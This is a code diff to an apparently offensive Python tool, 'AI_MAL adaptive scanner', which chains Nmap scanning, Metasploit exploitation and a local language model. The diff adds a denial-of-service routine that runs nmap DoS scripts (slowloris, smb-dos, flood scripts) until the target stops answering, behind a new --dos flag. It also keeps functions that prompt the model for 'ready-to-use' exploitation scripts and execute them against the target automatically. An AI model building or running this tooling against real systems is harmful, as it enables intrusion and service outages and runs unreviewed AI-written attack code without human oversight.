@@ -37,6 +37,269 @@ if not logger.handlers:
     console_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
     logger.addHandler(console_handler)
 
+class TerminalViewer:
+    """Class to handle terminal output formatting and display."""
+    
+    def __init__(self, quiet=False):
+        self.quiet = quiet
+        self.width = self._get_terminal_width()
+        self.border_char = "="
+        self.section_char = "-"
+    
+    def _get_terminal_width(self):
+        """Get the terminal width or default to 80 columns."""
+        try:
+            import shutil
+            columns = shutil.get_terminal_size().columns
+            return min(columns, 100)  # Limit to 100 columns max
+        except:
+            return 80
+    
+    def header(self, title, char="="):
+        """Display a header with the given title."""
+        if self.quiet:
+            return
+            
+        print(f"\n{char * self.width}")
+        print(f"{title.center(self.width)}")
+        print(f"{char * self.width}")
+    
+    def section(self, title):
+        """Display a section header."""
+        if self.quiet:
+            return
+            
+        print(f"\n{self.section_char * self.width}")
+        print(f"{title}")
+        print(f"{self.section_char * self.width}")
+    
+    def result_box(self, title, content):
+        """Display content in a formatted box with title."""
+        if self.quiet:
+            return
+            
+        print(f"\n{self.section_char * self.width}")
+        print(f"| {title}")
+        print(f"{self.section_char * self.width}")
+        print(content)
+        print(f"{self.section_char * self.width}")
+    
+    def status(self, message):
+        """Display a status message."""
+        if self.quiet:
+            return
+            
+        print(f"[*] {message}")
+    
+    def success(self, message):
+        """Display a success message."""
+        if self.quiet:
+            return
+            
+        print(f"\n[+] {message}")
+    
+    def warning(self, message):
+        """Display a warning message."""
+        if self.quiet:
+            return
+            
+        print(f"\n[!] {message}")
+    
+    def error(self, message):
+        """Display an error message."""
+        # Always show errors, even in quiet mode
+        print(f"\n[-] ERROR: {message}")
+    
+    def scan_summary(self, target, results):
+        """Display a summary of scan results."""
+        if self.quiet:
+            return
+            
+        if not results:
+            self.warning(f"No scan results for {target}")
+            return
+            
+        open_ports = []
+        os_info = "Unknown"
+        host_info = "Unknown"
+        
+        # Extract information from results
+        if 'scan' in results and target in results['scan']:
+            target_info = results['scan'][target]
+            
+            # Get hostname
+            if 'hostnames' in target_info and target_info['hostnames']:
+                host_info = target_info['hostnames'][0].get('name', 'Unknown')
+                
+            # Get OS info if available
+            if 'osmatch' in target_info and target_info['osmatch']:
+                os_info = target_info['osmatch'][0].get('name', 'Unknown')
+                
+            # Get open ports
+            for proto in ['tcp', 'udp']:
+                if proto in target_info:
+                    for port, port_data in target_info[proto].items():
+                        if port_data['state'] == 'open':
+                            service = port_data.get('name', 'unknown')
+                            product = port_data.get('product', '')
+                            version = port_data.get('version', '')
+                            
+                            service_str = f"{service}"
+                            if product:
+                                service_str += f" ({product}"
+                                if version:
+                                    service_str += f" {version}"
+                                service_str += ")"
+                                
+                            open_ports.append(f"{port}/{proto}: {service_str}")
+        
+        # Format the summary
+        summary = []
+        summary.append(f"Target: {target} ({host_info})")
+        summary.append(f"OS: {os_info}")
+        summary.append(f"Open Ports: {len(open_ports)}")
+        
+        for port in open_ports:
+            summary.append(f"  - {port}")
+            
+        self.result_box(f"SCAN SUMMARY FOR {target}", "\n".join(summary))
+    
+    def exploit_summary(self, target, exploit_results):
+        """Display a summary of exploitation attempts."""
+        if self.quiet:
+            return
+            
+        if not exploit_results:
+            self.warning(f"No exploitation results for {target}")
+            return
+            
+        summary = []
+        summary.append(f"Target: {target}")
+        summary.append(f"Total Exploits Attempted: {exploit_results.get('total_attempts', 0)}")
+        summary.append(f"Successful Exploits: {exploit_results.get('successful', 0)}")
+        
+        # List successful exploits
+        if 'details' in exploit_results:
+            for port, exploits in exploit_results['details'].items():
+                for exploit in exploits:
+                    status = "✓" if exploit.get('success', False) else "✗"
+                    summary.append(f"  {status} {port}: {exploit.get('name', 'Unknown')}")
+        
+        self.result_box(f"EXPLOITATION SUMMARY FOR {target}", "\n".join(summary))
+    
+    def script_generation_summary(self, script_path, script_type, summary):
+        """Display a summary of generated script."""
+        if self.quiet:
+            return
+            
+        if not script_path:
+            self.warning("Script generation failed")
+            return
+            
+        info = []
+        info.append(f"Script Type: {script_type}")
+        info.append(f"Location: {os.path.abspath(script_path)}")
+        info.append(f"Summary: {summary}")
+        
+        self.result_box(f"GENERATED SCRIPT: {os.path.basename(script_path)}", "\n".join(info))
+    
+    def script_execution_summary(self, script_path, return_code, output):
+        """Display a summary of script execution."""
+        if self.quiet:
+            return
+            
+        if not script_path:
+            self.warning("Script execution failed")
+            return
+            
+        info = []
+        info.append(f"Status: {'Completed Successfully' if return_code == 0 else 'Failed'}")
+        
+        # Trim output if it's too long
+        if output and len(output) > 500:
+            output = output[:500] + "...\n[Output truncated]"
+            
+        if output:
+            info.append("\nOutput:")
+            info.append(output)
+        
+        self.result_box(f"SCRIPT EXECUTION: {os.path.basename(script_path)}", "\n".join(info))
+    
+    def dos_attack_summary(self, target, successful, method=None):
+        """Display a summary of DoS attack results."""
+        if self.quiet:
+            return
+            
+        info = []
+        info.append(f"Target: {target}")
+        info.append(f"Status: {'SUCCESS - Target Unreachable' if successful else 'FAILED - Target Still Responding'}")
+        
+        if method:
+            info.append(f"Method: {method}")
+            
+        self.result_box("DENIAL OF SERVICE ATTACK RESULTS", "\n".join(info))
+
+    def progress_bar(self, current, total, prefix='Progress:', suffix='Complete', length=50, fill='█'):
+        """Display a progress bar in the terminal."""
+        if self.quiet:
+            return
+            
+        percent = ("{0:.1f}").format(100 * (current / float(total)))
+        filled_length = int(length * current // total)
+        bar = fill * filled_length + '-' * (length - filled_length)
+        print(f'\r{prefix} |{bar}| {percent}% {suffix}', end='\r')
+        
+        # Print new line on complete
+        if current == total:
+            print()
+    
+    def display_start_banner(self, target, scan_type, model):
+        """Display a banner when the scanner starts."""
+        if self.quiet:
+            return
+            
+        import platform
+        import getpass
+        
+        banner = []
+        banner.append(f"\n{'=' * self.width}")
+        banner.append(f"{'AI_MAL ADAPTIVE SCANNER'.center(self.width)}")
+        banner.append(f"{'=' * self.width}")
+        banner.append(f"Target: {target}")
+        banner.append(f"Scan Type: {scan_type}")
+        banner.append(f"Model: {model}")
+        banner.append(f"OS: {platform.system()} {platform.release()}")
+        banner.append(f"User: {getpass.getuser()}")
+        banner.append(f"Time: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+        banner.append(f"{'=' * self.width}")
+        
+        print("\n".join(banner))
+
+    def scanning_animation(self, text, duration=5, interval=0.1):
+        """Display a scanning animation for the specified duration."""
+        if self.quiet:
+            return
+            
+        import itertools
+        import time
+        import threading
+        
+        animation = itertools.cycle(['|', '/', '-', '\\'])
+        stop_animation = threading.Event()
+        
+        def animate():
+            for _ in range(int(duration / interval)):
+                if stop_animation.is_set():
+                    break
+                print(f'\r[{next(animation)}] {text}', end='')
+                time.sleep(interval)
+            print(f'\r[✓] {text} - Complete' + ' ' * 20)
+            
+        t = threading.Thread(target=animate)
+        t.start()
+        
+        return stop_animation
+
 class NetworkDiscovery:
     """Class to handle automatic network discovery."""
     
@@ -316,7 +579,8 @@ class AdaptiveNmapScanner:
         host_timeout=1,
         custom_scripts=False,
         script_type="bash",
-        execute_scripts=False
+        execute_scripts=False,
+        dos_attack=False
     ):
         # Set up logging
         self.logger = logging.getLogger("adaptive_scanner")
@@ -371,6 +635,9 @@ class AdaptiveNmapScanner:
         else:
             self.network_discovery = None
         
+        # Create terminal viewer
+        self.viewer = TerminalViewer(quiet=quiet)
+        
         # Log initialization
         logger.info(f"Initialized Adaptive Nmap Scanner")
         if target:
@@ -392,6 +659,9 @@ class AdaptiveNmapScanner:
         # Initialize Metasploit if enabled
         if self.msf_integration:
             self.setup_metasploit()
+        
+        # DoS attack
+        self.dos_attack = dos_attack
     
     def _discover_network(self):
         """Discover the network and hosts."""
@@ -757,7 +1027,8 @@ class AdaptiveNmapScanner:
         if not self.metasploit or not self.matching_exploits:
             return
         
-        logger.info(f"Running exploits against target: {target}")
+        self.logger.info(f"Running exploits against target: {target}")
+        self.viewer.header(f"EXPLOITATION PHASE: {target}", "=")
         
         # Run each exploit through resource script
         script_path = self.generate_resource_script()
@@ -768,6 +1039,15 @@ class AdaptiveNmapScanner:
             for port_key in self.matching_exploits.keys():
                 if port_key in self.discovered_services:
                     self.discovered_services[port_key]['exploitation_attempted'] = True
+            
+            # Collect exploitation results for summary
+            exploit_results = {
+                'total_attempts': sum(len(exploits) for exploits in self.matching_exploits.values()),
+                'successful': 0,  # This would need to be updated based on actual results
+                'details': self.matching_exploits
+            }
+            
+            self.viewer.exploit_summary(target, exploit_results)
 
     def _get_local_ip(self):
         """Get the local IP address."""
@@ -783,15 +1063,309 @@ class AdaptiveNmapScanner:
             s.close()
             return local_ip
         except:
-            logger.warning("Could not determine local IP address")
+            self.logger.warning("Could not determine local IP address")
             return "127.0.0.1"
+
+    def perform_dos_attack(self, target):
+        """Perform Denial of Service attacks against the target."""
+        if not self.dos_attack:
+            return False
+            
+        self.logger.info(f"Attempting DoS attack against {target}")
+        self.viewer.header(f"DENIAL OF SERVICE ATTACK: {target}", "=")
+        
+        try:
+            # First, check if the target is still up
+            if not self.network_discovery.ping_host(target):
+                self.logger.warning(f"Target {target} is already unreachable")
+                self.viewer.warning(f"Target {target} is already unreachable")
+                return False
+                
+            # Use nmap's DoS-related scripts
+            self.logger.info("Using nmap scripts for DoS testing")
+            dos_scripts = [
+                "http-slowloris",
+                "smb-dos",
+                "ipv6-ra-flood", 
+                "dns-flood"
+            ]
+            
+            for script in dos_scripts:
+                script_cmd = f"nmap -Pn -p- --script={script} {target}"
+                if self.stealth:
+                    script_cmd += " -T2"
+                
+                self.logger.info(f"Running DoS script: {script}")
+                self.viewer.status(f"Testing vulnerability to {script} attack...")
+                
+                try:
+                    process = subprocess.Popen(
+                        script_cmd.split(),
+                        stdout=subprocess.PIPE,
+                        stderr=subprocess.PIPE,
+                        text=True
+                    )
+                    # Let it run for a few seconds before checking target status
+                    time.sleep(5)
+                    
+                    # Check if target is still responding
+                    if not self.network_discovery.ping_host(target):
+                        self.logger.info(f"Target {target} is now unreachable - DoS appears successful")
+                        self.viewer.dos_attack_summary(target, True, script)
+                        
+                        # Terminate the process as we've achieved the goal
+                        process.terminate()
+                        return True
+                    
+                    # If still up after 10 seconds, let it run up to 30 seconds total
+                    time.sleep(25)
+                    process.terminate()
+                    
+                    # Final check if target is still responding
+                    if not self.network_discovery.ping_host(target):
+                        self.logger.info(f"Target {target} is now unreachable after extended attack")
+                        self.viewer.dos_attack_summary(target, True, script)
+                        return True
+                        
+                except Exception as e:
+                    self.logger.error(f"Error during DoS attack with {script}: {str(e)}")
+                    
+            # If we get here, none of the scripts worked
+            self.logger.warning(f"All DoS attacks failed to take down {target}")
+            self.viewer.dos_attack_summary(target, False)
+            
+            # If custom scripts are enabled, try generating a DoS script
+            if self.custom_scripts:
+                self.logger.info("Attempting to generate a custom DoS script")
+                self.viewer.status("Generating custom DoS script...")
+                
+                script_path = self.generate_custom_script(
+                    script_type=self.script_type,
+                    target_info={"target": target, "purpose": "dos_attack"}
+                )
+                
+                if script_path and self.execute_scripts:
+                    self.logger.info(f"Executing custom DoS script: {script_path}")
+                    self.viewer.status(f"Executing custom DoS script...")
+                    
+                    success = self.execute_generated_script(script_path, [target])
+                    
+                    # Check if target is still up after custom script
+                    if not self.network_discovery.ping_host(target):
+                        self.logger.info(f"Target {target} is now unreachable after custom DoS script")
+                        self.viewer.dos_attack_summary(target, True, "Custom Script")
+                        return True
+            
+            return False
+                
+        except Exception as e:
+            self.logger.error(f"Error performing DoS attack: {str(e)}")
+            self.logger.debug(traceback.format_exc())
+            self.viewer.error(f"Error performing DoS attack: {str(e)}")
+            return False
+
+    def generate_custom_script(self, script_type="bash", target_info=None):
+        """
+        Generate a custom script based on scan results using Ollama
+        
+        Args:
+            script_type (str): Type of script to generate (bash, python, ruby)
+            target_info (dict): Target information to use for script generation
+            
+        Returns:
+            str: Path to the generated script
+        """
+        if not self.custom_scripts:
+            self.logger.warning("Custom script generation is disabled")
+            return None
+            
+        self.logger.info(f"Generating custom {script_type} script based on scan results")
+        self.viewer.status(f"Generating custom {script_type} script...")
+        
+        # Use target_info if provided, otherwise use the current target
+        if target_info is None:
+            current_target = self.target
+            target_info = self.summarize_results(self.run_nmap_scan(self.generate_scan_parameters(1)))
+        
+        # Prepare data for the model
+        scan_summary = json.dumps(target_info, indent=2)
+        
+        # Construct the prompt
+        prompt = f"""
+        You are a cybersecurity expert writing custom scripts for reconnaissance and analysis.
+        
+        Based on the following scan results, create a useful {script_type} script that could help a security professional
+        analyze this system further or extract more information. Include detailed comments and a clear summary at the beginning.
+        Make sure to start the script with a clear description of what it does in a comment section titled "SCRIPT SUMMARY".
+        
+        Scan Results:
+        {scan_summary}
+        
+        Create a complete, ready-to-use {script_type} script that is useful for further analysis or exploitation.
+        """
+        
+        try:
+            # Prepare model
+            self.logger.debug(f"Calling Ollama model: {self.ollama_model}")
+            
+            # Get script content from Ollama
+            script_content = self.call_ollama(prompt)
+            
+            if not script_content:
+                self.logger.error("Failed to generate script content")
+                self.viewer.error("Failed to generate script content")
+                return None
+                
+            # Extract code block if present
+            code_pattern = r"```(?:\w+)?\s*([\s\S]*?)```"
+            code_match = re.search(code_pattern, script_content)
+            if code_match:
+                script_content = code_match.group(1).strip()
+            
+            # Create output directory if it doesn't exist
+            os.makedirs("generated_scripts", exist_ok=True)
+            
+            # Determine file extension
+            extension = {
+                "bash": "sh",
+                "python": "py",
+                "ruby": "rb"
+            }.get(script_type.lower(), "txt")
+            
+            # Generate a filename
+            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+            target_str = self.target.replace('.', '_').replace(':', '_')
+            script_filename = f"generated_scripts/{script_type}_{target_str}_{timestamp}.{extension}"
+            
+            # Write the script to file
+            with open(script_filename, "w") as f:
+                f.write(script_content)
+            
+            # Make the script executable
+            if script_type.lower() != "python":
+                os.chmod(script_filename, os.stat(script_filename).st_mode | stat.S_IEXEC)
+            
+            self.logger.info(f"Custom script generated: {script_filename}")
+            
+            # Extract summary from the script
+            summary_pattern = r"SCRIPT SUMMARY[:\s]*(.*?)(?:\n\n|\n#|\n$)"
+            summary_match = re.search(summary_pattern, script_content, re.IGNORECASE | re.DOTALL)
+            
+            summary = "No summary available"
+            if summary_match:
+                summary = summary_match.group(1).strip()
+                # Clean up the summary (remove comment marks and extra whitespace)
+                summary = re.sub(r'^#\s*', '', summary, flags=re.MULTILINE)
+                summary = re.sub(r'\n\s*#\s*', ' ', summary)
+                summary = re.sub(r'\s+', ' ', summary).strip()
+            
+            # Display summary to console using the viewer
+            self.viewer.script_generation_summary(script_filename, script_type, summary)
+            
+            return script_filename
+        except Exception as e:
+            self.logger.error(f"Error generating custom script: {str(e)}")
+            self.logger.debug(traceback.format_exc())
+            self.viewer.error(f"Error generating custom script: {str(e)}")
+            return None
+
+    def execute_generated_script(self, script_path, args=None):
+        """
+        Execute a generated script
+        
+        Args:
+            script_path (str): Path to the script to execute
+            args (list): Optional arguments to pass to the script
+            
+        Returns:
+            bool: True if successful, False otherwise
+        """
+        if not self.execute_scripts:
+            self.logger.warning("Script execution is disabled")
+            return False
+            
+        if not script_path or not os.path.exists(script_path):
+            self.logger.error(f"Script not found: {script_path}")
+            return False
+            
+        try:
+            # Determine how to execute based on file extension
+            extension = os.path.splitext(script_path)[1].lower()
+            
+            cmd = []
+            if extension == '.py':
+                cmd = ['python3', script_path]
+            elif extension in ['.sh', '.bash']:
+                cmd = ['bash', script_path]
+            elif extension == '.rb':
+                cmd = ['ruby', script_path]
+            else:
+                # Default to direct execution if it's executable
+                cmd = [script_path]
+                
+            # Add any arguments
+            if args:
+                if isinstance(args, list):
+                    cmd.extend(args)
+                else:
+                    cmd.append(str(args))
+            
+            # Execute the script
+            self.logger.info(f"Executing script: {' '.join(cmd)}")
+            self.viewer.status(f"Executing script: {os.path.basename(script_path)}")
+            
+            # Set up process
+            process = subprocess.Popen(
+                cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True,
+                bufsize=1
+            )
+            
+            # Collect output
+            output_lines = []
+            for line in process.stdout:
+                output_lines.append(line.rstrip())
+                self.logger.debug(f"Script output: {line.strip()}")
+                
+            # Get return code
+            return_code = process.wait()
+            
+            # Get stderr output
+            stderr_output = process.stderr.read()
+            if stderr_output:
+                output_lines.append("\nERROR OUTPUT:")
+                output_lines.append(stderr_output)
+                self.logger.warning(f"Script error output: {stderr_output}")
+            
+            # Display execution summary
+            self.viewer.script_execution_summary(
+                script_path, 
+                return_code, 
+                "\n".join(output_lines)
+            )
+            
+            return return_code == 0
+            
+        except Exception as e:
+            self.logger.error(f"Error executing script: {str(e)}")
+            self.logger.debug(traceback.format_exc())
+            self.viewer.error(f"Error executing script: {str(e)}")
+            return False
 
     def run(self):
         """Start the adaptive scanning process."""
         try:
+            # Display start banner
+            scan_type = "Full-Auto" if self.continuous else f"Limited ({self.max_iterations} iterations)"
+            self.viewer.display_start_banner(self.target or "Auto-discovery", scan_type, self.ollama_model)
+            
             # Set up Metasploit if enabled
             if self.msf_integration:
+                animation = self.viewer.scanning_animation("Setting up Metasploit...", duration=2)
                 self.setup_metasploit()
+                animation.set()
             
             # If auto-discovery enabled, try to find targets first
             if self.auto_discover and self.network_discovery:
@@ -845,16 +1419,23 @@ class AdaptiveNmapScanner:
             while should_continue and self.running:
                 # Check if we've reached the maximum iterations
                 if not self.continuous and iteration > self.max_iterations:
-                    logger.info(f"Reached maximum iterations ({self.max_iterations}). Stopping.")
+                    self.logger.info(f"Reached maximum iterations ({self.max_iterations}). Stopping.")
                     should_continue = False
                 else:
-                    logger.info(f"\n{'=' * 50}")
-                    logger.info(f"Starting scan iteration {iteration} on {self.target}")
-                    logger.info(f"{'=' * 50}")
+                    self.viewer.header(f"SCAN ITERATION {iteration}: {self.target}", "=")
                     
                     # Generate scan parameters
                     scan_params = self.generate_scan_parameters(iteration)
+                    
+                    # Show scanning animation
+                    scan_message = f"Running scan iteration {iteration}/{self.max_iterations if not self.continuous else '∞'}"
+                    animation = self.viewer.scanning_animation(scan_message, duration=15)
+                    
+                    # Run the scan
                     result = self.run_nmap_scan(scan_params)
+                    
+                    # Stop animation
+                    animation.set()
                     
                     if result:
                         # Update scan history
@@ -872,7 +1453,15 @@ class AdaptiveNmapScanner:
                             if self.exploit:
                                 self.run_exploits_on_host(self.target)
                     
-                    # Generate custom script if enabled (after we've gathered enough data)
+                    # Run Metasploit exploits if enabled
+                    if self.msf_integration and self.exploit and should_continue:
+                        self.run_exploits_on_host(self.target)
+                    
+                    # Perform DoS attack if enabled
+                    if self.dos_attack and should_continue:
+                        self.perform_dos_attack(self.target)
+                    
+                    # Generate custom scripts if enabled
                     scripts_generated = len(self.generated_scripts)
                     if self.custom_scripts and iteration >= 2 and scripts_generated < 3:
                         self.logger.info(f"Generating custom {self.script_type} script based on scan results...")
@@ -887,6 +1476,7 @@ class AdaptiveNmapScanner:
                             # Execute the script if enabled
                             if self.execute_scripts:
                                 self.logger.info(f"Executing generated script: {script_path}")
+                                self.viewer.status(f"Executing generated script...")
                                 self.execute_generated_script(script_path, [self.target])
                             else:
                                 self.logger.info(f"Script generated but not executed. To run: {script_path} {self.target}")
@@ -902,16 +1492,21 @@ class AdaptiveNmapScanner:
                         time.sleep(self.delay)
             
         except KeyboardInterrupt:
-            logger.info("\nScan interrupted by user. Exiting...")
+            self.logger.info("\nScan interrupted by user. Exiting...")
+            self.viewer.warning("Scan interrupted by user. Exiting...")
         except Exception as e:
-            logger.error(f"Error during scan: {str(e)}")
-            logger.debug(traceback.format_exc())
+            self.logger.error(f"Error during scan: {str(e)}")
+            self.logger.debug(traceback.format_exc())
+            self.viewer.error(f"Error during scan: {str(e)}")
         finally:
             # Show summary of generated scripts
             if self.custom_scripts and self.generated_scripts:
-                logger.info(f"\nGenerated {len(self.generated_scripts)} scripts:")
+                self.logger.info(f"\nGenerated {len(self.generated_scripts)} scripts:")
+                summary = []
+                summary.append(f"Total Scripts: {len(self.generated_scripts)}")
                 for script in self.generated_scripts:
-                    logger.info(f"  - {script}")
+                    summary.append(f"  - {script}")
+                self.viewer.result_box("GENERATED SCRIPTS SUMMARY", "\n".join(summary))
             
             # Clean up resources
             if self.metasploit:
@@ -1025,7 +1620,8 @@ Provide ONLY the Nmap command line parameters (without 'nmap' prefix) for the ne
     def run_nmap_scan(self, scan_params):
         """Run an Nmap scan with the given parameters and return the result."""
         try:
-            logger.info(f"Running Nmap scan with parameters: {' '.join(scan_params)}")
+            self.logger.info(f"Running Nmap scan with parameters: {' '.join(scan_params)}")
+            self.viewer.status(f"Running Nmap scan against {self.target}")
             
             # Remove target from params as nmap_scan() expects it separately
             params = [p for p in scan_params if p != self.target]
@@ -1035,23 +1631,73 @@ Provide ONLY the Nmap command line parameters (without 'nmap' prefix) for the ne
             nm = nmap.PortScanner()
             
             # Execute scan with parameters
-            logger.debug(f"Executing: nmap {' '.join(params)} {target}")
-            result = nm.scan(hosts=target, arguments=' '.join(params))
+            self.logger.debug(f"Executing: nmap {' '.join(params)} {target}")
+            
+            # Start time for progress estimation
+            start_time = time.time()
+            estimated_duration = 60  # Default estimated scan time in seconds
+            
+            # Start scan in a separate thread so we can update progress bar
+            scan_completed = threading.Event()
+            scan_result = [None]
+            
+            def run_scan():
+                try:
+                    scan_result[0] = nm.scan(hosts=target, arguments=' '.join(params))
+                finally:
+                    scan_completed.set()
+            
+            scan_thread = threading.Thread(target=run_scan)
+            scan_thread.start()
+            
+            # Show progress bar while scanning
+            while not scan_completed.is_set():
+                elapsed = time.time() - start_time
+                progress = min(elapsed / estimated_duration, 0.99)  # Cap at 99% until complete
+                self.viewer.progress_bar(
+                    current=int(progress * 100),
+                    total=100,
+                    prefix=f'Scanning {target}:',
+                    suffix=f'Elapsed: {int(elapsed)}s'
+                )
+                time.sleep(0.5)
+            
+            # Ensure the thread is done
+            scan_thread.join()
+            
+            # Final progress update
+            self.viewer.progress_bar(
+                current=100,
+                total=100,
+                prefix=f'Scanning {target}:',
+                suffix=f'Complete in {int(time.time() - start_time)}s'
+            )
+            
+            result = scan_result[0]
             
             if target in nm.all_hosts():
                 host_info = nm[target]
-                logger.info(f"Scan completed: {len(host_info.get('tcp', {}))} TCP ports and {len(host_info.get('udp', {}))} UDP ports found")
+                tcp_count = len(host_info.get('tcp', {}))
+                udp_count = len(host_info.get('udp', {}))
+                self.logger.info(f"Scan completed: {tcp_count} TCP ports and {udp_count} UDP ports found")
+                
+                # Display scan summary
+                self.viewer.scan_summary(target, result)
+                
                 return result
             else:
-                logger.warning(f"No results found for target {target}")
+                self.logger.warning(f"No results found for target {target}")
+                self.viewer.warning(f"No results found for target {target}")
                 return None
             
         except nmap.PortScannerError as e:
-            logger.error(f"Nmap scan error: {str(e)}")
+            self.logger.error(f"Nmap scan error: {str(e)}")
+            self.viewer.error(f"Nmap scan error: {str(e)}")
             return None
         except Exception as e:
-            logger.error(f"Error during Nmap scan: {str(e)}")
-            logger.debug(traceback.format_exc())
+            self.logger.error(f"Error during Nmap scan: {str(e)}")
+            self.logger.debug(traceback.format_exc())
+            self.viewer.error(f"Error during Nmap scan: {str(e)}")
             return None
 
     def summarize_results(self, result):
@@ -1200,204 +1846,6 @@ Provide ONLY the Nmap command line parameters (without 'nmap' prefix) for the ne
         
         return ','.join(sorted(open_ports, key=int)) if open_ports else ""
 
-    def generate_custom_script(self, script_type="bash", target_info=None):
-        """
-        Generate a custom script based on scan results using Ollama
-        
-        Args:
-            script_type (str): Type of script to generate (bash, python, ruby)
-            target_info (dict): Target information to use for script generation
-            
-        Returns:
-            str: Path to the generated script
-        """
-        if not self.custom_scripts:
-            self.logger.warning("Custom script generation is disabled")
-            return None
-            
-        self.logger.info(f"Generating custom {script_type} script based on scan results")
-        
-        # Use target_info if provided, otherwise use the current target
-        if target_info is None:
-            current_target = self.target
-            target_info = self.summarize_results(self.run_nmap_scan(self.generate_scan_parameters(1)))
-        
-        # Prepare data for the model
-        scan_summary = json.dumps(target_info, indent=2)
-        
-        # Construct the prompt
-        prompt = f"""
-        You are a cybersecurity expert writing custom scripts for reconnaissance and analysis.
-        
-        Based on the following scan results, create a useful {script_type} script that could help a security professional
-        analyze this system further or extract more information. Include detailed comments and a clear summary at the beginning.
-        Make sure to start the script with a clear description of what it does in a comment section titled "SCRIPT SUMMARY".
-        
-        Scan Results:
-        {scan_summary}
-        
-        Create a complete, ready-to-use {script_type} script that is useful for further analysis or exploitation.
-        """
-        
-        try:
-            # Prepare model
-            self.logger.debug(f"Calling Ollama model: {self.ollama_model}")
-            
-            # Get script content from Ollama
-            script_content = self.call_ollama(prompt)
-            
-            if not script_content:
-                self.logger.error("Failed to generate script content")
-                return None
-                
-            # Extract code block if present
-            code_pattern = r"```(?:\w+)?\s*([\s\S]*?)```"
-            code_match = re.search(code_pattern, script_content)
-            if code_match:
-                script_content = code_match.group(1).strip()
-            
-            # Create output directory if it doesn't exist
-            os.makedirs("generated_scripts", exist_ok=True)
-            
-            # Determine file extension
-            extension = {
-                "bash": "sh",
-                "python": "py",
-                "ruby": "rb"
-            }.get(script_type.lower(), "txt")
-            
-            # Generate a filename
-            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
-            target_str = current_target.replace('.', '_').replace(':', '_')
-            script_filename = f"generated_scripts/{script_type}_{target_str}_{timestamp}.{extension}"
-            
-            # Write the script to file
-            with open(script_filename, "w") as f:
-                f.write(script_content)
-            
-            # Make the script executable
-            if script_type.lower() != "python":
-                os.chmod(script_filename, os.stat(script_filename).st_mode | stat.S_IEXEC)
-            
-            self.logger.info(f"Custom script generated: {script_filename}")
-            
-            # Extract summary from the script
-            summary_pattern = r"SCRIPT SUMMARY[:\s]*(.*?)(?:\n\n|\n#|\n$)"
-            summary_match = re.search(summary_pattern, script_content, re.IGNORECASE | re.DOTALL)
-            
-            summary = "No summary available"
-            if summary_match:
-                summary = summary_match.group(1).strip()
-                # Clean up the summary (remove comment marks and extra whitespace)
-                summary = re.sub(r'^#\s*', '', summary, flags=re.MULTILINE)
-                summary = re.sub(r'\n\s*#\s*', ' ', summary)
-                summary = re.sub(r'\s+', ' ', summary).strip()
-            
-            # Print summary to console
-            print(f"\n{'-'*80}")
-            print(f"GENERATED SCRIPT: {os.path.basename(script_filename)}")
-            print(f"TYPE: {script_type}")
-            print(f"SUMMARY: {summary}")
-            print(f"LOCATION: {os.path.abspath(script_filename)}")
-            print(f"{'-'*80}\n")
-            
-            return script_filename
-        except Exception as e:
-            self.logger.error(f"Error generating custom script: {str(e)}")
-            self.logger.debug(traceback.format_exc())
-            return None
-
-    def execute_generated_script(self, script_path, args=None):
-        """
-        Execute a generated script
-        
-        Args:
-            script_path (str): Path to the script to execute
-            args (list): Optional arguments to pass to the script
-            
-        Returns:
-            bool: True if successful, False otherwise
-        """
-        if not self.execute_scripts:
-            self.logger.warning("Script execution is disabled")
-            return False
-            
-        if not script_path or not os.path.exists(script_path):
-            self.logger.error(f"Script not found: {script_path}")
-            return False
-            
-        try:
-            # Determine how to execute based on file extension
-            extension = os.path.splitext(script_path)[1].lower()
-            
-            cmd = []
-            if extension == '.py':
-                cmd = ['python3', script_path]
-            elif extension in ['.sh', '.bash']:
-                cmd = ['bash', script_path]
-            elif extension == '.rb':
-                cmd = ['ruby', script_path]
-            else:
-                # Default to direct execution if it's executable
-                cmd = [script_path]
-                
-            # Add any arguments
-            if args:
-                if isinstance(args, list):
-                    cmd.extend(args)
-                else:
-                    cmd.append(str(args))
-                    
-            # Print execution information
-            print(f"\n{'-'*80}")
-            print(f"EXECUTING SCRIPT: {os.path.basename(script_path)}")
-            print(f"COMMAND: {' '.join(cmd)}")
-            print(f"{'-'*80}\n")
-            
-            # Execute the script
-            self.logger.info(f"Executing script: {' '.join(cmd)}")
-            
-            # Set up process
-            process = subprocess.Popen(
-                cmd,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                text=True,
-                bufsize=1
-            )
-            
-            # Handle output in real-time
-            print("SCRIPT OUTPUT:")
-            print(f"{'-'*40}")
-            
-            # Real-time output handling
-            for line in process.stdout:
-                print(line, end='')  # Print to console
-                self.logger.debug(f"Script output: {line.strip()}")
-                
-            # Get return code
-            return_code = process.wait()
-            
-            # Print any errors
-            stderr_output = process.stderr.read()
-            if stderr_output:
-                print(f"\nERROR OUTPUT:")
-                print(f"{'-'*40}")
-                print(stderr_output)
-                self.logger.warning(f"Script error output: {stderr_output}")
-                
-            print(f"{'-'*40}")
-            print(f"Script completed with return code: {return_code}")
-            print(f"{'-'*80}\n")
-            
-            return return_code == 0
-            
-        except Exception as e:
-            self.logger.error(f"Error executing script: {str(e)}")
-            self.logger.debug(traceback.format_exc())
-            print(f"\nERROR: Failed to execute script: {str(e)}")
-            return False
-
 def main():
     parser = argparse.ArgumentParser(description="Adaptive Nmap scanner with Ollama and Metasploit integration")
     # Optional target
@@ -1412,6 +1860,7 @@ def main():
     parser.add_argument("--workspace", default="adaptive_scan", help="Metasploit workspace name (default: adaptive_scan)")
     parser.add_argument("--stealth", action="store_true", help="Enable stealth mode for scans to avoid detection")
     parser.add_argument("--auto-script", action="store_true", help="Auto-generate and run Metasploit resource scripts")
+    parser.add_argument("--dos", action="store_true", help="Attempt Denial of Service attacks against target hosts")
     parser.add_argument("--full-auto", action="store_true", help="Full autonomous mode (implies --continuous --msf --exploit --auto-script)")
     parser.add_argument("--quiet", action="store_true", help="Reduce verbosity of output")
     parser.add_argument("--debug", action="store_true", help="Enable debug logging")
@@ -1486,7 +1935,8 @@ def main():
         host_timeout=args.host_timeout,
         custom_scripts=args.custom_scripts,
         script_type=args.script_type,
-        execute_scripts=args.execute_scripts
+        execute_scripts=args.execute_scripts,
+        dos_attack=args.dos
     )
     
     # Additional setup for network option
